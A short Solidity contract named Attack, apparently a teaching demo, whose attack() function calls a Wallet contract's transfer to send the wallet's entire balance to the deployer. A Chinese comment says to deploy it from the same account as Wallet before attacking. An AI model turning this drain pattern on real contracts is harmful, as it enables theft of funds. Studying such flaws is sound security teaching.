// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./Wallet.sol";

contract Attack {
    address payable public owner;
    Wallet public wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }
    
    /* 用和Wallet合约同一个账户部署，再进行攻击 */
    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }

    
}